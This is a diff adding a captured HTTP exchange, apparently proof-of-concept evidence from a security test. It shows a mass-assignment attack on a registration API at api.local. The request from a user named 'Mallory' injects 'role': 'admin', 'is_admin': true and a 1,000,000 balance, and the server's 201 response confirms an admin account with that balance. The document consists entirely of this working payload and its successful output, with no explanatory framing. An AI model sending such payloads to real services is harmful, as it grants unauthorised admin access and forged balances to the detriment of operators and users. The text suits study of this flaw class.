@@ -1,0 +1,13 @@
+POST /api/v1/register HTTP/1.1
+Host: api.local
+Content-Type: application/json
+Content-Length: 137
+
+{"username": "mallory_5b5b32", "password": "Mallory#2026", "full_name": "Mallory", "role": "admin", "is_admin": true, "balance": 1000000}
+
+HTTP/1.1 201 CREATED
+Server: nginx/1.24.0 (Ubuntu)
+Content-Type: application/json
+Content-Length: 162
+
+{"balance":1000000,"card_last4":null,"email":null,"full_name":"Mallory","id":106,"iin":null,"is_admin":1,"phone":null,"role":"admin","username":"mallory_5b5b32"}
